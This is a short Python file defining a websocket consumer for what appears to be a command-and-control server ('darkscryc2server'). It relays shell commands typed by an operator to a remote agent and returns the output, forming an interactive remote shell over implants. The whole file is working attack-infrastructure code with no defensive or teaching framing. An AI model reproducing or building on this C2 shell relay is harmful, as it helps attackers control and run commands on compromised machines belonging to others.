# yourapp/consumers.py
import json
from channels.generic.websocket import AsyncWebsocketConsumer
from darkscryc2server.Utils.remote_utils.commands import remote_send_command
from darkscryc2server.Models.ModulesSchemas.Execution import RunCommand

class ShellConsumer(AsyncWebsocketConsumer):

    async def connect(self):
        self.agent_id = self.scope["url_route"]["kwargs"]["agent_id"]
        await self.accept()


    async def receive(self, *args, **kwargs):
        text_data = kwargs.get("text_data")
        bytes_data = kwargs.get("bytes_data")
        data = text_data or bytes_data
        if data is None:
            raise ValueError("No data was presented")
        print("Got data: "+ str(data))
        data = json.loads(data)
        command = data.get("command")
        # Do shell logic or dispatch to a worker, etc.
        result = await remote_send_command(
            conn_id=self.agent_id,
            command=RunCommand(command=command).xml()
        )
        # Echo back:
        await self.send(json.dumps({
            "message": result.data
        }))